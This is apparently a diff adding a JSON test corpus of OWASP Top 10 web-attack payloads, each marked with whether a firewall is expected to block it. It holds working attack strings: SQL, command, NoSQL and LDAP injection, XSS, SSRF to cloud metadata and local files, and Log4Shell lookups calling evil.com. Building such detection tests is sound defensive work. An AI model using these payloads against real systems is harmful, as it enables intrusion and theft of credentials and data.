@@ -1,0 +1,236 @@
+[
+  {
+    "id": "OWASP-A01-BAC-001",
+    "payload": "GET /admin/users HTTP/1.1\r\nCookie: role=admin",
+    "tags": ["owasp-top10", "A01", "broken-access-control", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A01:2021 - Broken Access Control - Cookie manipulation",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A01-BAC-002",
+    "payload": "GET /api/users/../../admin/config",
+    "tags": ["owasp-top10", "A01", "broken-access-control", "path-traversal", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A01:2021 - Path traversal to admin",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A01-BAC-003",
+    "payload": "GET /api/users/123 HTTP/1.1\r\nX-User-Id: 456",
+    "tags": ["owasp-top10", "A01", "idor"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "OWASP A01:2021 - IDOR via header manipulation",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A02-CRYPTO-001",
+    "payload": "GET /api/data HTTP/1.1\r\nAccept-Encoding: identity\r\nCache-Control: no-store",
+    "tags": ["owasp-top10", "A02", "crypto-failures"],
+    "expected_block": false,
+    "severity_hint": "Low",
+    "notes": "OWASP A02:2021 - Testing cache headers (informational)",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A03-INJ-001",
+    "payload": "GET /api/users?id=1' OR '1'='1",
+    "tags": ["owasp-top10", "A03", "injection", "sqli", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A03:2021 - SQL Injection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A03-INJ-002",
+    "payload": "GET /api/search?q=<script>alert('XSS')</script>",
+    "tags": ["owasp-top10", "A03", "injection", "xss", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A03:2021 - XSS Injection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A03-INJ-003",
+    "payload": "GET /api/exec?cmd=;cat /etc/passwd",
+    "tags": ["owasp-top10", "A03", "injection", "oscmd", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A03:2021 - OS Command Injection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A03-INJ-004",
+    "payload": "GET /api/query?filter={\"$where\":\"this.password.match(/.*/)\"}}",
+    "tags": ["owasp-top10", "A03", "injection", "nosql", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A03:2021 - NoSQL Injection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A03-INJ-005",
+    "payload": "GET /api/ldap?user=*)(uid=*))(|(uid=*",
+    "tags": ["owasp-top10", "A03", "injection", "ldap"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A03:2021 - LDAP Injection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A04-DESIGN-001",
+    "payload": "POST /api/transfer HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"amount\":-1000,\"to\":\"attacker\"}",
+    "tags": ["owasp-top10", "A04", "insecure-design"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "OWASP A04:2021 - Negative amount bypass",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A05-MISCONFIG-001",
+    "payload": "GET /.git/config",
+    "tags": ["owasp-top10", "A05", "security-misconfiguration", "quick"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "OWASP A05:2021 - Git config exposure",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A05-MISCONFIG-002",
+    "payload": "GET /.env",
+    "tags": ["owasp-top10", "A05", "security-misconfiguration", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A05:2021 - Environment file exposure",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A05-MISCONFIG-003",
+    "payload": "GET /server-status",
+    "tags": ["owasp-top10", "A05", "security-misconfiguration"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "OWASP A05:2021 - Server status page",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A05-MISCONFIG-004",
+    "payload": "GET /phpinfo.php",
+    "tags": ["owasp-top10", "A05", "security-misconfiguration"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "OWASP A05:2021 - PHP info exposure",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A06-VULN-001",
+    "payload": "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; Nessus SOAP)",
+    "tags": ["owasp-top10", "A06", "vulnerable-components"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "OWASP A06:2021 - Vulnerability scanner detection",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A06-VULN-002",
+    "payload": "GET /cgi-bin/test.cgi",
+    "tags": ["owasp-top10", "A06", "vulnerable-components"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "OWASP A06:2021 - Legacy CGI access",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A07-AUTH-001",
+    "payload": "POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"admin\"}",
+    "tags": ["owasp-top10", "A07", "auth-failures"],
+    "expected_block": false,
+    "severity_hint": "Low",
+    "notes": "OWASP A07:2021 - Default credentials (app should reject)",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A08-INTEGRITY-001",
+    "payload": "POST /api/update HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"__proto__\":{\"isAdmin\":true}}",
+    "tags": ["owasp-top10", "A08", "software-data-integrity", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A08:2021 - Prototype pollution",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A08-INTEGRITY-002",
+    "payload": "POST /api/deserialize HTTP/1.1\r\nContent-Type: application/x-java-serialized-object",
+    "tags": ["owasp-top10", "A08", "software-data-integrity"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A08:2021 - Java deserialization",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A09-LOGGING-001",
+    "payload": "GET /api/search?q=${jndi:ldap://evil.com/a}",
+    "tags": ["owasp-top10", "A09", "logging-failures", "log4shell", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A09:2021 - Log4Shell attack",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A09-LOGGING-002",
+    "payload": "GET /api/test?id=1 HTTP/1.1\r\nX-Forwarded-For: ${jndi:rmi://evil.com/a}",
+    "tags": ["owasp-top10", "A09", "logging-failures", "log4shell"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A09:2021 - Log4Shell in header",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A10-SSRF-001",
+    "payload": "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/",
+    "tags": ["owasp-top10", "A10", "ssrf", "aws", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A10:2021 - AWS metadata SSRF",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A10-SSRF-002",
+    "payload": "GET /api/fetch?url=http://localhost:22/",
+    "tags": ["owasp-top10", "A10", "ssrf", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A10:2021 - Localhost SSRF",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A10-SSRF-003",
+    "payload": "GET /api/fetch?url=file:///etc/passwd",
+    "tags": ["owasp-top10", "A10", "ssrf", "lfi", "quick"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A10:2021 - File protocol SSRF",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A10-SSRF-004",
+    "payload": "GET /api/fetch?url=http://[::1]:8080/admin",
+    "tags": ["owasp-top10", "A10", "ssrf", "ipv6"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A10:2021 - IPv6 localhost SSRF",
+    "category": "OWASP-Top10"
+  },
+  {
+    "id": "OWASP-A10-SSRF-005",
+    "payload": "GET /api/fetch?url=http://0177.0.0.1/admin",
+    "tags": ["owasp-top10", "A10", "ssrf", "octal"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "OWASP A10:2021 - Octal IP SSRF bypass",
+    "category": "OWASP-Top10"
+  }
+]
